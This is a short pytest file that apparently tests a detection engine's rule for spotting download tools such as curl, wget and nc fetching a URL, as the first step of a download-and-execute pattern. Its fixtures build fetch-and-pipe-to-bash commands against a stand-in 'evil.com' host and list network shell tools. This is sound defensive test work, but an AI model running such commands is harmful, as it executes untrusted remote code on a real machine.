import pytest
from app.detection.engine.correlation_engine import _is_event_a

CMD_URL_SHELL = "http://evil.com/s.sh | bash"
CMD_URL_ONLY = "http://evil.com/payload"
CMD_SHELL_ONLY = "| bash"


@pytest.mark.parametrize("tool", ["curl", "wget", "nc", "ncat", "socat", "openssl"])
def test_download_tool_with_url_and_shell_indicator_matches(tool):
    matched, url = _is_event_a(tool, f"{tool} {CMD_URL_SHELL}")
    assert matched is True
    assert url.startswith("http://")


def test_curl_without_url_does_not_match():
    matched, _ = _is_event_a("curl", f"curl {CMD_SHELL_ONLY}")
    assert matched is False


def test_curl_with_url_but_no_shell_indicator_matches():
    # Shell indicators in the URL are no longer required; the two-event pattern
    # (download tool + URL followed by a shell process) is sufficient.
    matched, url = _is_event_a("curl", f"curl {CMD_URL_ONLY}")
    assert matched is True
    assert url.startswith("http://")


def test_non_download_tool_does_not_match():
    matched, _ = _is_event_a("python", f"python {CMD_URL_SHELL}")
    assert matched is False
